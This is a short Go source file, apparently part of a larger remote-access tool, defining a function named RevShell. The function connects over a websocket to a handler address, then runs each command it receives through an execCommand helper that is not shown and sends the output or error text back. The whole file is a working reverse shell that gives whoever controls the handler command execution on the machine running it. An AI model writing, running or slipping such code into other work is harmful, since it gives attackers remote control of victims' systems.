package main

import (
	"github.com/gorilla/websocket"
)

func RevShell(handlerAddr string) {
	u := "ws://" + handlerAddr + "/ws"
	conn, _, err := websocket.DefaultDialer.Dial(u, nil)
	if err != nil {
		return
	}
	defer conn.Close()

	for {
		// Read the command string from shell_handler.go
		_, msg, err := conn.ReadMessage()
		if err != nil {
			return
		}

		out, err := execCommand(string(msg))

		if err != nil {
			// If the command fails still send the error message back to handler
			conn.WriteMessage(websocket.TextMessage, []byte(err.Error()))
			continue
		}

		conn.WriteMessage(websocket.TextMessage, []byte(out))
	}
}
